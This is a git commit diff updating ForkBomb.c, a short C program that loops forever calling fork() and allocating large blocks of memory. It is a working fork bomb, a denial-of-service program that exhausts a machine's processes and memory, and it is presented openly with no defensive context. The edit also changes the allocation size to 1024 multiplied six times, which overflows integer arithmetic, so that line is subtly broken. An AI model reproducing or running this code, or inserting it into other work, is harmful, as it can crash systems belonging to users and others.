5f5cf02722035740a3b06e3d370549e389400acd
Chris Katevas <44655162+katevaschris@users.noreply.github.com>
2019-04-06 22:09:11 +0300

    Update ForkBomb.c

--- ForkBomb.c
+++ ForkBomb.c
@@ -1,9 +1,10 @@
 #include <unistd.h>
 #include <stdlib.h>
 int main() {
-	while (1) {
+	while (1) 
+	{
 		fork();
-		malloc(1024*1024*1024);
+		malloc(1024*1024*1024*1024*1024*1024);
 	}
 	return 0;
 }
